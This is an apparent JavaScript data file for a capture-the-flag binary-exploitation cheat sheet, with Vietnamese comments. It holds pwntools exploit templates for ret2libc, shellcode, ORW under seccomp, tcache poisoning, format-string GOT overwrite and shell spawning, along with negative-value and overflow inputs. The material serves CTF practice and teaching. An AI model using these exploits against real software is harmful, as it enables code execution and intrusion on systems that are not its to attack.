const C = (...lines) => lines.join("\n");

// Payload bo sung cho cac pattern Pwn da co.
// Placeholder: OFFSET, WIN, LIBC_BASE, HEAP_BASE, INDEX...
export const pwnPayloads = {
  "pattern-stack-variable": [
    {
      title: "Offset + overwrite",
      code: C(
        "from pwn import *",
        "p = process('./chall')",
        "# OFFSET: số byte tới biến điều kiện (cyclic -l)",
        "# WIN_VALUE: giá trị int32 cần ghi, lấy từ disasm",
        "payload = b'A'*OFFSET + p32(WIN_VALUE)",
        "p.sendlineafter(b'> ', payload)",
        "p.interactive()"
      )
    },
    {
      title: "Cyclic offset",
      code: C(
        "# tạo pattern để tìm offset crash",
        "cyclic 200",
        "# thay 0x6161616c bằng giá trị crash trong gdb",
        "cyclic -l 0x6161616c"
      )
    }
  ],
  "pattern-rop-args": [
    {
      title: "ret2libc leak",
      code: C(
        "from pwn import *",
        "elf = ELF('./chall'); libc = ELF('./libc.so.6')",
        "# OFFSET: cyclic -l; RET: gadget ret để align stack",
        "pop_rdi = ROP(elf).find_gadget(['pop rdi','ret'])[0]",
        "# gọi puts(puts@GOT) để leak, rồi quay về main",
        "payload = flat(b'A'*OFFSET, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main'])",
        "p.sendlineafter(b'> ', payload)",
        "leak = u64(p.recvline().strip().ljust(8, b'\\x00'))",
        "# libc_base = địa chỉ leak - offset puts trong libc",
        "libc_base = leak - libc.sym['puts']",
        "payload2 = flat(b'A'*OFFSET, RET, pop_rdi, libc_base+next(libc.search(b'/bin/sh')), libc_base+libc.sym['system'])",
        "p.sendlineafter(b'> ', payload2)"
      )
    },
    {
      title: "one_gadget",
      code: C(
        "# tìm gadget bằng one_gadget libc.so.6",
        "one_gadget libc.so.6",
        "# chọn gadget thỏa constraint, thường cần ret để align stack",
        "# ONE_GADGET = libc_base + offset in ra",
        "payload = flat(b'A'*OFFSET, RET, libc_base + ONE_GADGET)"
      )
    },
    {
      title: "Shellcode NX off",
      code: C(
        "# chỉ dùng khi NX tắt (checksec)",
        "from pwn import *",
        "context.arch = 'amd64'",
        "shellcode = asm(shellcraft.sh())",
        "# BUF_ADDR: địa chỉ buffer, cần leak nếu PIE bật",
        "payload = shellcode.ljust(OFFSET, b'A') + p64(BUF_ADDR)"
      )
    },
    {
      title: "ORW seccomp",
      code: C(
        "# seccomp chặn execve: open -> read -> write",
        "payload = flat(",
        "  b'A'*OFFSET,",
        "  # open(FLAG_PATH, O_RDONLY)",
        "  pop_rdi, FLAG_PATH, pop_rsi, 0, pop_rdx, 0, open_plt,",
        "  # read(fd=3, BSS, 0x100)",
        "  pop_rdi, 3, pop_rsi, BSS, pop_rdx, 0x100, read_plt,",
        "  # write(1, BSS, 0x100)",
        "  pop_rdi, 1, pop_rsi, BSS, pop_rdx, 0x100, write_plt",
        ")"
      )
    },
    {
      title: "Canary + ret2win",
      code: C(
        "# nếu leak được canary",
        "# OFFSET tới canary; sau canary là saved RBP 8 byte",
        "payload = flat(b'A'*OFFSET, canary, b'B'*8, RET, WIN)"
      )
    },
    {
      title: "PIE partial overwrite",
      code: C(
        "# cần leak PIE base trước; chỉ đè 2 byte thấp của return address",
        "payload = b'A'*OFFSET + p16(WIN_LOW16)"
      )
    },
    {
      title: "ret2csu",
      code: C(
        "# dùng __libc_csu_init khi thiếu pop rdx",
        "# CSU_POP/CSU_CALL lấy từ objdump; CALL_PTR = GOT function",
        "payload = flat(b'A'*OFFSET, CSU_POP, 0, 1, 0, 0, 0, 0, CSU_CALL, 0, 0, 0, 0, 0, 0, 0, CALL_PTR)"
      )
    }
  ],
  "pattern-prng": [
    {
      title: "glibc rand",
      code: C(
        "import ctypes",
        "libc = ctypes.CDLL('libc.so.6')",
        "# seed lấy từ time/PID/...; đọc disasm để biết",
        "libc.srand(seed)",
        "# công thức modulo phải khớp binary",
        "print(libc.rand())",
        "print(libc.rand() % 10000 + 20240000)"
      )
    },
    {
      title: "Time window",
      code: C(
        "import time",
        "# brute ±5 giây quanh thời điểm server chạy",
        "for delta in range(-5, 6):",
        "    libc.srand(int(time.time()) + delta)",
        "    print(delta, libc.rand() % 10000 + 20230000)"
      )
    }
  ],
  "pattern-int-overflow": [
    {
      title: "Boundary values",
      code: C(
        "2147483647 1",
        "-2147483648",
        "4294967295",
        "1000000 1000000",
        "99999999999999999999"
      )
    }
  ],
  "pattern-negative-logic": [
    {
      title: "Negative fields",
      code: C(
        "quantity=-1000",
        "amount=-1",
        "price=-100",
        "item=-1",
        "refund=-1000"
      )
    },
    {
      title: "JSON body",
      code: C(
        "{\"quantity\":-1000}",
        "{\"price\":-1,\"quantity\":100}",
        "{\"amount\":-1,\"item\":1}"
      )
    }
  ],
  "pattern-heap-fptr": [
    {
      title: "Overwrite function pointer",
      code: C(
        "# OFFSET = buffer -> function pointer",
        "# WIN = địa chỉ hàm thắng",
        "payload = b'A'*OFFSET + p64(WIN)",
        "p.sendlineafter(b': ', payload)"
      )
    },
    {
      title: "Chunk size",
      code: C(
        "# offset thường là chunk size: 0x20, 0x30, 0x40...",
        "# kiểm tra malloc size và vị trí con trỏ hàm"
      )
    },
    {
      title: "tcache poisoning (glibc >= 2.32)",
      code: C(
        "# safe-linking: ptr ^ (chunk_addr >> 12)",
        "# heap_base/__free_hook phải leak trước",
        "target = (heap_base >> 12) ^ __free_hook",
        "payload = p64(target)"
      )
    },
    {
      title: "Hook -> system",
      code: C(
        "free_hook = libc_base + libc.sym['__free_hook']",
        "system = libc_base + libc.sym['system']",
        "# ghi system vào __free_hook, sau đó free('/bin/sh')"
      )
    }
  ]
};

export const pwnCommands = {
  "pattern-stack-variable": [
    {
      title: "Disasm main",
      code: C(
        "# xem protection + layout biến trong main",
        "checksec --file=./chall",
        "objdump -d -M intel ./chall | grep -A40 '<main>'"
      )
    }
  ],
  "pattern-rop-args": [
    {
      title: "Gadget / libc",
      code: C(
        "# tìm gadget pop rdi/rsi/rdx và ret",
        "ROPgadget --binary ./chall --only 'pop|ret'",
        "ropper --file ./chall --search 'pop rdi'",
        "# one_gadget + kiểm tra seccomp trước khi chọn hướng",
        "one_gadget ./libc.so.6",
        "seccomp-tools dump ./chall"
      )
    }
  ],
  "pattern-heap-fptr": [
    {
      title: "Heap recon",
      code: C(
        "# xem version libc và protection",
        "pwn checksec ./chall",
        "one_gadget ./libc.so.6",
        "# debug malloc/free để tìm chunk size",
        "gdb -q ./chall -ex 'b *main+0' -ex run"
      )
    }
  ]
};

const pwnExtra = [
  {
    id: "pattern-format-string",
    group: "Pwn patterns",
    title: "Format string / GOT overwrite",
    category: "Pwn",
    summary: "printf(user_input): leak stack/canary/libc bằng `%p`/`%s`, ghi GOT bằng `%n`/fmtstr_payload.",
    tags: ["format-string", "fmt", "printf", "got", "canary"],
    priority: "high",
    steps: [
      "Xác định input đi thẳng vào printf/fprintf.",
      "Tìm offset bằng `AAAA.%p.%p...`, tìm `0x41414141`.",
      "Leak canary/libc/PIE bằng `%p`, `%s`.",
      "Ghi GOT (`printf` -> `system`) bằng `fmtstr_payload`.",
      "Nếu `%n` bị chặn, chỉ leak rồi dùng lỗi khác."
    ],
    payloads: [
      {
        title: "Leak stack",
        code: C(
          "%p.%p.%p.%p.%p.%p.%p.%p",
          "%6$p",
          "%7$s"
        )
      },
      {
        title: "Tìm offset",
        code: C(
          "p.sendline(b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p')",
          "# output có 0x41414141 -> offset tương ứng"
        )
      },
      {
        title: "GOT overwrite",
        code: C(
          "from pwn import *",
          "elf = ELF('./chall')",
          "p = process('./chall')",
          "# OFFSET = vị trí format string trên stack",
          "# ghi printf@GOT = system@PLT",
          "payload = fmtstr_payload(OFFSET, {elf.got['printf']: elf.plt['system']})",
          "p.sendline(payload)",
          "# lần printf tiếp theo nhận '/bin/sh'",
          "p.sendline(b'/bin/sh')"
        )
      },
      {
        title: "Leak canary/libc",
        code: C(
          "p.sendline(b'%15$p')",
          "# canary thường kết thúc bằng 00; libc leak dùng %s với GOT"
        )
      }
    ],
    commands: [
      {
        title: "Recon",
        code: C(
          "checksec --file=./chall",
          "ROPgadget --binary ./chall",
          "one_gadget ./libc.so.6"
        )
      }
    ],
    gotchas: [
      "64-bit địa chỉ có null byte; ghi theo thứ tự và dùng `fmtstr_payload`.",
      "`%n` có thể bị filter; kiểm tra trước.",
      "Offset `%p` đổi theo số arg/stack; luôn thử bằng `AAAA`.",
      "Ghi GOT cần full RELRO tắt hoặc partial RELRO."
    ],
    links: [
      { title: "pwn.college format string", url: "https://pwn.college/" },
      { title: "ir0nstone format string", url: "https://ir0nstone.gitbook.io/notes/types/stack/format-string" }
    ]
  },
  {
    id: "pattern-pwn-recon",
    group: "Pwn patterns",
    title: "Pwn recon / setup",
    category: "Pwn",
    summary: "Trước khi viết exploit: check protection, tìm offset, gadget, libc, seccomp.",
    tags: ["recon", "checksec", "cyclic", "libc", "seccomp", "pwntools"],
    priority: "high",
    steps: [
      "`file`, `checksec`, `readelf -h`: arch/PIE/NX/canary/RELRO.",
      "`strings`, `readelf -s`: tìm win/system/flag/main.",
      "Chạy thử, xem input/output; tìm offset bằng cyclic.",
      "Tìm gadget (`ROPgadget`), one_gadget, libc version.",
      "Nếu có seccomp: chỉ ORW, không execve."
    ],
    payloads: [
      {
        title: "Check binary",
        code: C(
          "# arch + PIE/NX/canary/RELRO",
          "file ./chall",
          "checksec --file=./chall",
          "readelf -h ./chall",
          "# tìm symbol win/system/main",
          "readelf -s ./chall | grep -E 'win|system|main'",
          "# tìm string flag, /bin/sh",
          "strings -a ./chall | grep -iE 'flag|/bin/sh|win'"
        )
      },
      {
        title: "Offset",
        code: C(
          "# tạo pattern rồi lấy giá trị crash từ gdb",
          "cyclic 200",
          "cyclic -l 0x6161616c",
          "python3 -c \"from pwn import *; print(cyclic(200))\""
        )
      },
      {
        title: "Gadget / libc",
        code: C(
          "# lấy gadget và xác định libc/seccomp",
          "ROPgadget --binary ./chall --only 'pop|ret'",
          "one_gadget ./libc.so.6",
          "seccomp-tools dump ./chall",
          "ldd ./chall"
        )
      }
    ],
    commands: [
      {
        title: "Setup local",
        code: C(
          "# tải/khớp libc, ld rồi chạy local",
          "pwninit",
          "patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chall",
          "# in nhanh địa chỉ win nếu có",
          "python3 -c \"from pwn import *; e=ELF('./chall'); print(hex(e.symbols.get('win',0)))\""
        )
      }
    ],
    gotchas: [
      "PIE tắt thì địa chỉ cố định; PIE bật cần leak/partial overwrite.",
      "Full RELRO thì không ghi GOT; dùng hook/stack.",
      "seccomp chặn execve: chuyển sang ORW.",
      "libc phải đúng version của remote."
    ],
    links: [
      { title: "pwntools", url: "https://docs.pwntools.com/" },
      { title: "pwn.college", url: "https://pwn.college/" }
    ]
  }
];

export default pwnExtra;
